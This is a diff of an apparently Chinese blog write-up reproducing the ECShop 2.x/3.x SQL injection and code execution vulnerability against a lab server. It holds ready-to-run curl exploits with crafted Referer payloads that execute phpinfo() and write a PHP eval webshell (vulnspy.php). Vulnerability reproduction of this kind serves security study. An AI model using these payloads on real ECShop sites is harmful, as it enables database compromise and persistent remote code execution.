@@ -96,7 +96,7 @@
 <meta property="og:image" content="https://github.com/images/16.png">
 <meta property="og:image" content="https://github.com/images/17.png">
 <meta property="og:image" content="https://github.com/images/18.png">
-<meta property="og:updated_time" content="2018-09-05T13:39:44.914Z">
+<meta property="og:updated_time" content="2018-09-05T13:42:20.802Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECShop 2.x 3.x SQL注入、任意代码执行漏洞复现">
 <meta name="twitter:description" content="影响ECShop 2.x版本、ECShop 3.x版本 ECShop 2.x版本复现过程环境：ECShop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0">
@@ -321,7 +321,7 @@
 <p><img src="/images/11.png" alt="avatar"></p>
 <h2 id="ECshop-3-x版本复现过程"><a href="#ECshop-3-x版本复现过程" class="headerlink" title="ECshop 3.x版本复现过程"></a>ECshop 3.x版本复现过程</h2><p>环境：ECShop 3.6.0</p>
 <h3 id="执行phpinfo"><a href="#执行phpinfo" class="headerlink" title="执行phpinfo"></a>执行phpinfo</h3><p>在终端中执行：</p>
-<pre><code>$ curl http://xxx/user.php -d &quot;action=login&amp;vulnspy=phpinfo();exit;&quot; -H &apos;Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:&quot;num&quot;;s:207:&quot;*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--&quot;;s:2:&quot;id&quot;;s:9:&quot;&apos;&quot;&apos;&quot;&apos; union/*&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;}45ea207d7a2b68c49582d2d22adf953a&apos;
+<pre><code>$ curl http://192.168.2.195:8081/user.php -d &quot;action=login&amp;vulnspy=phpinfo();exit;&quot; -H &apos;Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:&quot;num&quot;;s:207:&quot;*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--&quot;;s:2:&quot;id&quot;;s:9:&quot;&apos;&quot;&apos;&quot;&apos; union/*&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;}45ea207d7a2b68c49582d2d22adf953a&apos;
 </code></pre><p>成功返回phpinfo()<br><img src="/images/14.png" alt="avatar"></p>
 <h3 id="拿webshell"><a href="#拿webshell" class="headerlink" title="拿webshell"></a>拿webshell</h3><p>在终端中执行：</p>
 <pre><code>$ curl http://192.168.2.195:8081/user.php \ -d &quot;action=login&amp;vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;&quot; \
